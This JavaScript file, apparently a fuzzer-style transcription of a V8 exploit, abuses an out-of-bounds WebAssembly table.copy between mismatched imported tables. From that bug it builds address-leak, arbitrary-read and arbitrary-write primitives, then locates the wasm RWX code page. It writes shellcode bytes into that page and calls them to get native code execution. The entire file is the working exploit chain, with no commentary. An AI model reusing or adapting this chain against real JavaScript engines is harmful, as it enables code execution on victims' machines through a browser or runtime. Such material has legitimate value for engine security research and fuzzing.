try {
    try { load("../../v8/v8/test/mjsunit/wasm/wasm-module-builder.js"); } catch (e) {}
    let v5;
    try { v5 = new ArrayBuffer(8); } catch (e) {}
    let conversion_buffer = v5;
    let v8;
    try { v8 = new Float64Array(conversion_buffer); } catch (e) {}
    let float_view = v8;
    let v11;
    try { v11 = new BigUint64Array(conversion_buffer); } catch (e) {}
    let int_view = v11;
    function f13() {
        let v17;
        try { v17 = this.toString(16); } catch (e) {}
        return "0x" + v17;
    }
    const t16 = BigInt?.prototype;
    t16.hex = f13;
    function f21() {
        int_view[0] = this;
        return float_view?.[0];
    }
    const t22 = BigInt?.prototype;
    t22.i2f = f21;
    function f25() {
        int_view[0] = this << 32n;
        return float_view?.[0];
    }
    const t28 = BigInt?.prototype;
    t28.smi2f = f25;
    function f31() {
        float_view[0] = this;
        return int_view?.[0];
    }
    const t34 = Number?.prototype;
    t34.f2i = f31;
    function f36() {
        float_view[0] = this;
        return int_view?.[0] >> 32n;
    }
    const t40 = Number?.prototype;
    t40.f2smi = f36;
    function f42() {
        let v44;
        try { v44 = BigInt(this); } catch (e) {}
        let v45;
        try { v45 = v44.i2f(); } catch (e) {}
        return v45;
    }
    const t49 = Number?.prototype;
    t49.i2f = f42;
    function f47() {
        let v49;
        try { v49 = BigInt(this); } catch (e) {}
        let v50;
        try { v50 = v49.smi2f(); } catch (e) {}
        return v50;
    }
    const t58 = Number?.prototype;
    t58.smi2f = f47;
    let instance;
    let instance2;
    const v57 = WebAssembly?.Table;
    const v61 = { initial: 16, maximum: 16, element: "anyfunc" };
    let v62;
    try { v62 = new v57(v61); } catch (e) {}
    let table1 = v62;
    const v64 = WebAssembly?.Table;
    const v68 = { initial: 256, maximum: 256, element: "anyfunc" };
    let v69;
    try { v69 = new v64(v68); } catch (e) {}
    let table2 = v69;
    let a;
    let b;
    let c;
    let d;
    {
        let v80;
        try { v80 = new WasmModuleBuilder(); } catch (e) {}
        let builder = v80;
        let v83;
        try { v83 = builder.addType(kSig_i_i); } catch (e) {}
        const void_sig = v83;
        let v87;
        try { v87 = builder.addImport("q", "func", void_sig); } catch (e) {}
        const func_index = v87;
        let v90;
        try { v90 = builder.addType(kSig_v_iii); } catch (e) {}
        let sig_v_iii = v90;
        try { builder.addExport("hack", func_index); } catch (e) {}
        let v98;
        try { v98 = builder.addImportedTable("q", "table1", 16, 16); } catch (e) {}
        const table_index1 = v98;
        let v104;
        try { v104 = builder.addImportedTable("q", "table2", 256, 256); } catch (e) {}
        const table_index2 = v104;
        const v113 = [kExprGetLocal,0,kExprGetLocal,1,kExprGetLocal,2,kNumericPrefix,kExprTableCopy,table_index1,table_index1];
        let v115;
        try { v115 = builder.addFunction("copy", sig_v_iii); } catch (e) {}
        let v116;
        try { v116 = v115.addBody(v113); } catch (e) {}
        try { v116.exportAs("copy"); } catch (e) {}
        let v118;
        try { v118 = builder.toModule(); } catch (e) {}
        let wasm_m = v118;
        const v120 = (a121) => {
            return 1;
        };
        let func = v120;
        const v124 = WebAssembly?.Instance;
        const v125 = { table1: table1, table2: table2, func: func };
        const v126 = { q: v125 };
        let v127;
        try { v127 = new v124(wasm_m, v126); } catch (e) {}
        instance = v127;
        a = [0.1,0.1,0.1,0.1,0.1,0.1];
        b = [1.1,1.2,1.3,1.4,1.5];
        c = [{},2.2,2.3,2.4,2.5,2.6,2.7,2.8];
        d = [3.1,3.2,3.3,3.4];
    }
    {
        let v156;
        try { v156 = new WasmModuleBuilder(); } catch (e) {}
        let builder = v156;
        let v159;
        try { v159 = builder.addType(kSig_i_i); } catch (e) {}
        const void_sig = v159;
        let v163;
        try { v163 = builder.addImport("q", "func", void_sig); } catch (e) {}
        const func_index = v163;
        let v166;
        try { v166 = builder.addType(kSig_v_iii); } catch (e) {}
        let sig_v_iii = v166;
        try { builder.addExport("hack", func_index); } catch (e) {}
        let v174;
        try { v174 = builder.addImportedTable("q", "table1", 256, 256); } catch (e) {}
        const table_index1 = v174;
        let v180;
        try { v180 = builder.addImportedTable("q", "table2", 16, 16); } catch (e) {}
        const table_index2 = v180;
        const v189 = [kExprGetLocal,0,kExprGetLocal,1,kExprGetLocal,2,kNumericPrefix,kExprTableCopy,table_index1,table_index1];
        let v191;
        try { v191 = builder.addFunction("copy", sig_v_iii); } catch (e) {}
        let v192;
        try { v192 = v191.addBody(v189); } catch (e) {}
        try { v192.exportAs("copy"); } catch (e) {}
        let v194;
        try { v194 = builder.toModule(); } catch (e) {}
        let wasm_m = v194;
        const v196 = (a197) => {
            return 1;
        };
        let func = v196;
        const v200 = WebAssembly?.Instance;
        const v201 = { table1: table2, table2: table1, func: func };
        const v202 = { q: v201 };
        let v203;
        try { v203 = new v200(wasm_m, v202); } catch (e) {}
        instance2 = v203;
    }
    const a_index = 69;
    const b_index = 81;
    const c_index = 92;
    const a_backing_store = 69 + 8;
    const BACKING_POINTER_OFFSET = 15n;
    let old;
    function addr_of(a219) {
        c[0] = a219;
        const v221 = instance2?.exports;
        try { v221.copy(a_index, c_index, 1); } catch (e) {}
        const v223 = a?.[0];
        let v224;
        try { v224 = v223.f2i(); } catch (e) {}
        let r = v224;
        return r;
    }
    function arb_read(a227) {
        const v229 = instance2?.exports;
        try { v229.copy(b_index, a_backing_store, 1); } catch (e) {}
        old = b?.[0];
        const v232 = a227 - BACKING_POINTER_OFFSET;
        let v233;
        try { v233 = v232.i2f(); } catch (e) {}
        b[0] = v233;
        const v235 = instance2?.exports;
        try { v235.copy(a_backing_store, b_index, 1); } catch (e) {}
        const v237 = a?.[0];
        let v238;
        try { v238 = v237.f2i(); } catch (e) {}
        let r = v238;
        b[0] = old;
        const v241 = instance2?.exports;
        try { v241.copy(a_backing_store, b_index, 1); } catch (e) {}
        return r;
    }
    function arb_write(a244, a245) {
        const v247 = instance2?.exports;
        try { v247.copy(b_index, a_backing_store, 1); } catch (e) {}
        old = b?.[0];
        const v250 = a244 - BACKING_POINTER_OFFSET;
        let v251;
        try { v251 = v250.i2f(); } catch (e) {}
        b[0] = v251;
        const v253 = instance2?.exports;
        try { v253.copy(a_backing_store, b_index, 1); } catch (e) {}
        let v255;
        try { v255 = a245.i2f(); } catch (e) {}
        a[0] = v255;
        b[0] = old;
        const v257 = instance2?.exports;
        try { v257.copy(a_backing_store, b_index, 1); } catch (e) {}
    }
    const v259 = {};
    let v260;
    try { v260 = addr_of(v259); } catch (e) {}
    let leak_addr = v260;
    try { arb_read(leak_addr); } catch (e) {}
    let v263;
    try { v263 = old.f2i(); } catch (e) {}
    let test_backing = v263 + BACKING_POINTER_OFFSET;
    const v267 = test_backing + 8n;
    let v268;
    try { v268 = arb_read(v267); } catch (e) {}
    let v269;
    try { v269 = v268.i2f(); } catch (e) {}
    if (v269 != 0.1) {
        throw "[-] arb_read failed";
    }
    const v274 = test_backing + 8n;
    let v276;
    try { v276 = (1.337).f2i(); } catch (e) {}
    try { arb_write(v274, v276); } catch (e) {}
    if (a?.[1] != 1.337) {
        throw "[-] arb_write failed";
    }
    try { console.log("[+] success arb r/w "); } catch (e) {}
    let v285;
    try { v285 = addr_of(instance); } catch (e) {}
    wasm_i_addr = v285;
    const v292 = (17 * 8) - 1;
    let v293;
    try { v293 = BigInt(v292); } catch (e) {}
    const v294 = wasm_i_addr + v293;
    let v295;
    try { v295 = arb_read(v294); } catch (e) {}
    wasm_f_addr = v295;
    let v299;
    try { v299 = wasm_f_addr.hex(); } catch (e) {}
    const v300 = "[+] rwx page : " + v299;
    try { console.log(v300); } catch (e) {}
    const v305 = (test_backing - 16n) + 8n;
    let v306;
    try { v306 = arb_read(v305); } catch (e) {}
    let wtf = v306;
    const v311 = (test_backing - 16n) + 8n;
    let v313;
    try { v313 = (4660).smi2f(); } catch (e) {}
    let v314;
    try { v314 = v313.f2i(); } catch (e) {}
    try { arb_write(v311, v314); } catch (e) {}
    a.length = 4660;
    let v319;
    try { v319 = BigInt("0x91969dd1bb48c031"); } catch (e) {}
    let v322;
    try { v322 = BigInt("0x53dbf748ff978cd0"); } catch (e) {}
    let v325;
    try { v325 = BigInt("0xb05e545752995f54"); } catch (e) {}
    let v328;
    try { v328 = BigInt("0xcccccccccc050f3b"); } catch (e) {}
    let shellcode = [v319,v322,v325,v328];
    for (let i332 = 0; i332 < shellcode?.length; i332++) {
        let v340;
        try { v340 = BigInt("0x380"); } catch (e) {}
        const v341 = wasm_f_addr + v340;
        const v343 = 8 * i332;
        let v344;
        try { v344 = BigInt(v343); } catch (e) {}
        const v346 = (v341 + v344) - BACKING_POINTER_OFFSET;
        let v347;
        try { v347 = v346.i2f(); } catch (e) {}
        a[19] = v347;
        const v348 = shellcode?.[i332];
        let v349;
        try { v349 = v348.i2f(); } catch (e) {}
        b[0] = v349;
    }
    const v350 = instance?.exports;
    try { v350.copy(); } catch (e) {}
} catch(e352) {
}
